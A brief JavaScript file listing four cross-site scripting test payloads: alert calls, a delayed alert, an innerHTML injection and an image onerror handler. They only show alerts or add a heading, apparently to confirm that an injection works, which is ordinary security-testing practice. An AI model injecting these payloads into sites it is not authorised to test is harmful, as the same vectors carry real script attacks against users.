// Payload 1: Simple XSS alert
alert('XSS Payload 1 Triggered');

// Payload 2: Another alert with a different method
setTimeout(function() {
    alert('XSS Payload 2 Triggered');
}, 1000);

// Payload 3: DOM manipulation XSS (for example, modifying the DOM)
document.body.innerHTML += '<h1>Injected Content</h1>';

// Payload 4: Event-based XSS
var img = document.createElement('img');
img.src = 'x';
img.onerror = function() {
    alert('Image-based XSS Triggered');
};
document.body.appendChild(img);
